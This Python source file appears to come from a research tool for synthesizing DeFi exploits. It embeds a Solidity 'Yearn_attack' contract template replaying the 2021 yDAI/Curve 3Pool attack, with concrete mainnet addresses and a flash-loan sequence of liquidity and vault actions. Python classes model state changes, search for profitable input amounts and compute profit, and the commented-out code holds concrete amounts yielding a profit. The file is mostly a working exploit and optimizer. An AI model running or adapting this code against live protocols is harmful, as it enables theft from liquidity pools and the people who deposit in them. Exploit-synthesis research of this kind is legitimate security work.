import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict
from Actions.Utils import *
from Actions.UtilsPrecision import *


class YearnAction():
    initialStates = [207765963, 227557960, 192118527, 13369, 31561046, 13235]
    globalStates = initialStates.copy()
    # globalStates[0]: DAI liquidity
    # globalStates[1]: USDC liquidity
    # globalStates[2]: USDT liquidity
    # globalStates[3]: yDAI balance
    # globalStates[4]: yDAI total supply
    # globalStates[5]: yDAI available

    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/YearnI.sol";

// Block 11792260
// Block index 11
// Timestamp Thu, 04 Feb 2021 21:31:21 +0000
// Gas price 390 gwei
// Gas limit 11665684
// TX: 0xf6022012b73770e7e2177129e648980a82aab555f9ac88b8a9cda3ec44b30779


contract Yearn_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant cDAIAddress = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    address private constant cETHAddress = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address private constant comptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    address private constant cUSDCAddress = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant yDAIAddress = 0xACd43E627e64355f1861cEC6d3a6688B31a6F952;
    address private constant CurveFi3PoolAddress = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address private constant USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant Curve3CrvAddress = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;


    address[] private markets = new address[](2);

    ICEther cETH = ICEther(payable(cETHAddress));
    CTokenInterface cDAI = CTokenInterface(cDAIAddress);
    IERC20 DAI = IERC20(DAIAddress);
    CTokenInterface cUSDC = CTokenInterface(cUSDCAddress);
    IERC20 USDC = IERC20(USDCAddress);
    IERC20 USDT = IERC20(USDTAddress);
    yTokenInterface yDAI = yTokenInterface(yDAIAddress);
    ICurveFi CURVE_3Pool = ICurveFi(CurveFi3PoolAddress);
    IERC20 Crv = IERC20(Curve3CrvAddress);
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    string str5 = "";

    string str89 = "";
    string str90 = "";
    string str91 = "";
    string str92 = "";

    uint[3] amounts;


    constructor() payable {
        StandardToken(USDCAddress).approve(CurveFi3PoolAddress, 2**256 - 1);
        StandardToken(DAIAddress).approve(CurveFi3PoolAddress, 2**256 - 1);
        StandardToken(USDTAddress).approve(CurveFi3PoolAddress, 2**256 - 1);
        StandardToken(DAIAddress).approve(cDAIAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(cUSDCAddress, 2**256 - 1);
        DAI.approve(yDAIAddress, 0);
        DAI.approve(yDAIAddress, 2**256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}
    '''

    startStr_attack = '''    // loan amount =  130M DAI, 134M USDC
    function attack( $$_$$ ) public {

'''

    endStr_attack = '''        revert(ProfitSummary());
    }
    '''

    endStr_contract = '''
    function yDAISummary() internal returns (string memory _uintAsString){
        uint balance = DAI.balanceOf(yDAIAddress) / 10 ** 18;
        uint supply = yDAI.totalSupply() / 10 ** 18;
        uint available = yDAI.available() / 10 ** 18;
        str89 = append("yDAI balance: ", uint2str(balance));
        str90 = append("yDAI total supply: ", uint2str(supply));
        str91 = append("yDAI available: ", uint2str(available));
        return appendWithSpace(appendWithSpace(str89, str90), str91);
    }

    function yDAIBalanceAvailable() internal returns (string memory _uintAsString){
       uint balance = DAI.balanceOf(yDAIAddress) / 10 ** 18;
        uint available = yDAI.available() / 10 ** 18;
        str89 = append("yDAI balance: ", uint2str(balance));        
        str90 = append("yDAI available: ", uint2str(available));
        return appendWithSpace(str89, str90);
    }

    function CurveBalanceSummary() internal returns (string memory _uintAsString){
        uint balance1 = CURVE_3Pool.balances(0) / 10 ** 18;  // DAI
        uint balance2 = CURVE_3Pool.balances(1) / 10 ** 6;  // USDC
        uint balance3 = CURVE_3Pool.balances(2) / 10 ** 6;  // USDT
        str89 = append("Curve DAI Liquidity: ", uint2str(balance1));
        str90 = append(" Curve USDC Liquidity: ", uint2str(balance2));
        str91 = append(" Curve USDT Liquidity: ", uint2str(balance3));
        return append(append(str89, str90), str91);
    }

    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance0 = USDT.balanceOf(address(this)) / 10 ** 6;
        uint balance1 = USDC.balanceOf(address(this)) / 10 ** 6;
        uint balance2 = DAI.balanceOf(address(this)) / 10 ** 18;
        uint balance = Curve3CrvToken(Curve3CrvAddress).balanceOf(address(this)) / 10 ** 18;
        str89 = append("USDT balance: ", uint2str(balance0));
        str90 = append("USDC balance: ", uint2str(balance1));
        str91 = append("DAI balance: ", uint2str(balance2));
        str92 = append("Crv balance: ", uint2str(balance));
        return appendWithSpace(appendWithSpace(str89, str90), appendWithSpace(str91, str92));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }
}

    '''
    
    initialBalances = {"DAI": 130000000, "USDC": 134000000}
    currentBalances = {"DAI": 130000000, "USDC": 134000000}
    TargetTokens = {'USDT', 'USDC', 'DAI', 'Crv'}
    TokenPrices = {"USDT": 1.0, "USDC": 1.0, 'DAI':1.0, 'Crv': 1.0}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()


    def calcProfit(stats):
        if stats == None or len(stats) != 4:
            return 0
        profit = stats[0] + stats[1] - 134000000 + stats[2] - 130000000 + stats[3] *  1.0
        #        USDT       USDC                    DAI                    CRV
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)

    def initialPass():
        action1 = AddLiquidityDAIUSDC       #pool               DAI, USDC -> Crv
        action2 = RemoveImbalance           #pool               Crv -> USDT
        action3 = DeposityDAI               #yDAI               DAI -> yDAI
        action4 = EarnyDAI                  #yDAI, pool        yDAI -> None
        action5 = AddLiquidityUSDT          #pool               USDT -> Crv
        action6 = WithdrawyDAI              #yDAI, pool         yDAI -> DAI
        action7 = RemoveImbalanceDAIUSDC    #pool               3Crv -> DAI, USDC
        
        action_list_1 = [action1, action2, action3, action4, action5, action6, action7]
        action1_prestate_dependency = [action2, action5, action7]
        action2_prestate_dependency = [action1, action5, action7]
        action3_prestate_dependency = [action1, action2, action6]
        action4_prestate_dependency = [action1, action2, action3, action5, action6, action7]
        action5_prestate_dependency = [action1, action2, action7]
        action6_prestate_dependency = [action1, action2, action3, action4, action5, action7]
        action7_prestate_dependency = [action1, action2, action5]

        # # seq of actions
        ActionWrapper = YearnAction
        action_lists = [action1_prestate_dependency + [action1], action2_prestate_dependency + [action2], \
                        action3_prestate_dependency + [action3], action4_prestate_dependency + [action4], \
                        action5_prestate_dependency + [action5], action6_prestate_dependency + [action6], \
                        action7_prestate_dependency + [action7] ]
                        
        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))

    def runinitialPass():
        return



class AddLiquidityDAIUSDC(YearnAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None

    # Action Specific Variables
    numInputs = 2
    tokensIn = ['DAI', 'USDC']
    tokensOut = ['Crv']
    range = [0, 40000000]   # 36090075
    range2 = [0, 134000000] # 134000000
        
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''       amounts = [uint256( $$ * 10 ** 18), uint256( $$ * 10 ** 6), 0];
        CURVE_3Pool.add_liquidity(amounts, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = CurveBalanceSummary();
        uint CrvGot = Crv.balanceOf(address(this));

        amounts = [uint256($$ * 10 ** 18), uint256($$ * 10 ** 6), 0];
        CURVE_3Pool.add_liquidity(amounts, 0);

        str2 = CurveBalanceSummary();
        CrvGot = ( Crv.balanceOf(address(this)) - CrvGot ) / 10 ** 18; 
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(CrvGot)));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-2], inputs[-1]] # because of two inputs
        if point in cls.points: 
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve DAI Liquidity
        cls.values[1].append(v1)  # Curve USDC Liquidity
        cls.values[2].append(v2)  # Curve USDT Liquidity
        cls.values[3].append(v3)  # Crv Out

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input, input2):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2], input, input2]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)

        return output0, output1, output2, output3 

    @classmethod
    def transit(cls, input, input2): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['DAI'] -= input
        cls.currentBalances['USDC'] -= input2
        output0, output1, output2, output3 = cls.simulate(input, input2)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] = output2

        if "Crv" not in cls.currentBalances:
            cls.currentBalances["Crv"] = output3
        else:
            cls.currentBalances["Crv"] += output3
        return

    @classmethod
    def string(cls):
        return cls.__name__

class RemoveImbalance(YearnAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None    

    # Action Specific Variables
    numInputs = 1
    tokensIn = ['Crv']
    tokensOut = ['USDT']
    range = [0, 200000000]   # 165927603
        
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        amounts = [0, 0, uint256($$ * 10 ** 6)];
        CURVE_3Pool.remove_liquidity_imbalance(amounts, 300000000000000000000000000);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = CurveBalanceSummary();
        uint CrvCost = Crv.balanceOf(address(this));

        amounts = [0, 0, uint256($$ * 10 ** 6)];
        CURVE_3Pool.remove_liquidity_imbalance(amounts, 300000000000000000000000000);

        str2 = CurveBalanceSummary();
        CrvCost = ( CrvCost - Crv.balanceOf(address(this)) ) / 10 ** 18;
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(CrvCost)));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve DAI Liquidity
        cls.values[1].append(v1)  # Curve USDC Liquidity
        cls.values[2].append(v2)  # Curve USDT Liquidity
        cls.values[3].append(v3)  # USDT Out

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)

        return output0, output1, output2, output3 

    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        if "USDT" not in cls.currentBalances:
            cls.currentBalances["USDT"] = input
        else:
            cls.currentBalances["USDT"] += input

        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] = output2

        cls.currentBalances['Crv'] -= output3

        return

    @classmethod
    def string(cls):
        return cls.__name__

class DeposityDAI(YearnAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None     


    numInputs = 1
    tokensIn = ['DAI']
    tokensOut = ['yDAI']
    range = [0, 100000000]   # 93909925
        
    @classmethod
    def actionStr(cls):
        action = "      // Action: DeposityDAI\n"
        action += '''        yDAI.deposit($$ * 10 ** 18 );  \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: DeposityDAI\n"
        action += '''        str1 = yDAISummary();
        uint yDAIgot = yDAI.balanceOf(address(this));

        yDAI.deposit($$ * 10 ** 18 );     
        
        str2 = yDAISummary();
        yDAIgot = ( yDAI.balanceOf(address(this)) - yDAIgot ) / 10 ** 18;
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(yDAIgot)));

'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # yDAI balance
        cls.values[1].append(v1)  # yDAI total supply
        cls.values[2].append(v2)  # yDAI available
        cls.values[3].append(v3)  # yDAI Out

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[3], cls.globalStates[4], \
            cls.globalStates[5], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)

        return output0, output1, output2, output3 

    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['DAI'] -= input

        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[3] = output0
        cls.globalStates[4] = output1
        cls.globalStates[5] = output2

        if "yDAI" not in cls.currentBalances:
            cls.currentBalances["yDAI"] = output3
        else:
            cls.currentBalances["yDAI"] += output3
        return

    @classmethod
    def string(cls):
        return cls.__name__

class EarnyDAI(YearnAction):
    points = []
    values = [[], [], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None    
    approximator4 = None        

    numInputs = 0
    tokensIn = ['yDAI']
    tokensOut = []
    range = [] 
    
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ +  "\n"
        action += '''        yDAI.earn();   \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ +  "\n"
        action += '''        str1 = CurveBalanceSummary();
        str2 = yDAIBalanceAvailable();
        yDAI.earn();                             // Force invest DAI to 3Pool where DAI is devalued, reach a state of "USDT light"
        str3 = CurveBalanceSummary();
        str4 = yDAIBalanceAvailable();
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(str3, str4)));

'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[5], values[6], values[7], values[8], values[9]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 10:
            return -1

        point = [values[0], values[1], values[2], values[3], values[4]]

        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3, v4= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve DAI Liquidity
        cls.values[1].append(v1)  # Curve USDC Liquidity
        cls.values[2].append(v2)  # Curve USDT Liquidity
        cls.values[3].append(v3)  # yDAI balance
        cls.values[4].append(v4)  # yDAI available

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        cls.approximator4 = NumericalApproximator(cls.points, cls.values[4])


        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2], cls.globalStates[3], cls.globalStates[5]]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)
        output4 = cls.approximator4(inputs)


        return output0, output1, output2, output3, output4

    @classmethod
    def transit(cls): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        output0, output1, output2, output3, output4 = cls.simulate()

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] = output2
        cls.globalStates[3] = output3
        cls.globalStates[5] = output4

        return

    @classmethod
    def string(cls):
        return cls.__name__

class AddLiquidityUSDT(YearnAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None    

    numInputs = 1
    tokensIn = ['USDT']
    tokensOut = ['Crv']
    range = [0, 200000000]   # 165927602
        
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        amounts = [0, 0, uint256($$ * 10 ** 6)];
        CURVE_3Pool.add_liquidity(amounts, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = CurveBalanceSummary();
        uint CrvGot = Crv.balanceOf(address(this));

        amounts = [0, 0, uint256($$ * 10 ** 6)];
        CURVE_3Pool.add_liquidity(amounts, 0);

        str2 = CurveBalanceSummary();
        CrvGot = ( Crv.balanceOf(address(this)) - CrvGot ) / 10 ** 18;
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(CrvGot)));

'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve DAI Liquidity
        cls.values[1].append(v1)  # Curve USDC Liquidity
        cls.values[2].append(v2)  # Curve USDT Liquidity
        cls.values[3].append(v3)  # Crv Out

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)

        return output0, output1, output2, output3 

    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['USDT'] -= input
        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] = output2

        if "Crv" not in cls.currentBalances:
            cls.currentBalances["Crv"] = output3
        else:
            cls.currentBalances["Crv"] += output3
        return

    @classmethod
    def string(cls):
        return cls.__name__

class WithdrawyDAI(YearnAction):
    points = []
    values = [[], [], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None    
    approximator4 = None    

    numInputs = 1
    tokensIn = ["yDAI"]
    tokensOut = ["DAI"]
    range = [0, 120000000]  # 100157382
        
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        yDAI.withdraw($$ * 10 ** 18);   \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = yDAISummary();
        str2 = CurveBalanceSummary();
        uint DAIgot = DAI.balanceOf(address(this));

        yDAI.withdraw($$ * 10 ** 18);
        
        str3 = yDAISummary();
        uint balance1 = CURVE_3Pool.balances(0) / 10 ** 18;  // DAI
        str4 = append("Curve DAI Liquidity: ", uint2str(balance1));
        DAIgot = ( DAI.balanceOf(address(this)) - DAIgot ) / 10 ** 18;
        revert(appendWithSpace(appendWithSpace(str1, appendWithSpace(appendWithSpace(str2, str3), str4)), uint2str(DAIgot)));

'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[6], values[7], values[8], values[9], values[10]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 11:
            return -1

        point = [values[0], values[1], values[2], values[3], values[4], values[5], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3, v4= cls.aliquotValues(values)
        cls.values[0].append(v0)  # yDAI balance
        cls.values[1].append(v1)  # yDAI total supply
        cls.values[2].append(v2)  # yDAI available
        cls.values[3].append(v3)  # Curve DAI Liquidity
        cls.values[4].append(v4)  # DAI Out

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0, 1, 2, -1])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0, 1, 2, -1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2], [0, 1, 2, -1])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [3, 4, 5, -1])
        cls.approximator4 = NumericalApproximator(cls.points, cls.values[4], [0, 1, 2, -1])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[3], cls.globalStates[4], cls.globalStates[5], input]
        new_inputs = [cls.globalStates[0], cls.globalStates[1], cls.globalStates[2], input]
        
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)
        output4 = cls.approximator4(inputs)

        return output0, output1, output2, output3, output4

    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['yDAI'] -= input
        output0, output1, output2, output3, output4 = cls.simulate(input)

        cls.globalStates[3] = output0
        cls.globalStates[4] = output1
        cls.globalStates[5] = output2

        cls.globalStates[0] = output3
        

        cls.currentBalances["DAI"] += output4
        return

    @classmethod
    def string(cls):
        return cls.__name__

class RemoveImbalanceDAIUSDC(YearnAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None  
  

    # Action Specific Variables
    numInputs = 2
    tokensIn = ['Crv']
    tokensOut = ['DAI', 'USDC']
    range = [0, 200000000]   # 36769867
    range2 = [0, 134000000] # 134000000
        
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        amounts =  [ uint($$ * 10 ** 18), uint($$ * 10 ** 6), 0];
        CURVE_3Pool.remove_liquidity_imbalance(amounts, 300000000 * 10 ** 18);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''                str1 = CurveBalanceSummary();
        uint CrvCost = Crv.balanceOf(address(this));

        amounts =  [ uint($$ * 10 ** 18), uint($$ * 10 ** 6), 0];
        CURVE_3Pool.remove_liquidity_imbalance(amounts, 300000000 * 10 ** 18);

        str2 = CurveBalanceSummary();
        CrvCost = ( CrvCost - Crv.balanceOf(address(this)) ) / 10 ** 18; 
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(CrvCost)));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve DAI Liquidity
        cls.values[1].append(v1)  # Curve USDC Liquidity
        cls.values[2].append(v2)  # Curve USDT Liquidity
        cls.values[3].append(v3)  # CRV cost

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input, input2):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2], input, input2]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)
        return output0, output1, output2, output3 

    @classmethod
    def transit(cls, input, input2): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['DAI'] += input
        cls.currentBalances['USDC'] += input2

        output0, output1, output2, output3 = cls.simulate(input, input2)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] = output2


        cls.currentBalances["Crv"] -= output3
        return

    @classmethod
    def string(cls):
        return cls.__name__



def main():

    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 217000
    config.blockNum = 11792260
    config.contract_name = "Yearn_attack"

# Test for initial pass of data collecton: 
    YearnAction.initialPass()

    # YearnAction.runinitialPass()
    # action1 = AddLiquidityDAIUSDC
    # action2 = RemoveImbalance
    # action3 = DeposityDAI
    # action4 = EarnyDAI
    # action5 = AddLiquidityUSDT
    # action6 = WithdrawyDAI
    # action7 = RemoveImbalanceDAIUSDC

    # action_list = [action1, action2, action3, action4, action5, action6, action7]
    # initial_guess = [36090075, 134000000, 165927602, 93014834, 165927602, 99202744, 36769867, 134000000]
    # ActionWrapper = YearnAction

    # # # Optimize(action_list, ActionWrapper)

    # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list)) # 56924.128741149354

    # actual_profit = 56924.128741149354
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4



if __name__ == "__main__":
    main()
    